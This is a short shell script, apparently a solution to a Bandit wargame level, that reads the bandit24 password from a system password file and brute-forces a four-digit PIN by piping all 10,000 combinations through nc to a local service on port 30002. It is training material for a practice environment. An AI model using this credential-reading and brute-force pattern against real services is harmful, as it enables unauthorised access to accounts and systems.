#!/bin/sh

pass=$(cat /etc/bandit_pass/bandit24)

for n in $(seq -w 0 9999); do
	echo "$pass $n"
done | nc localhost 30002
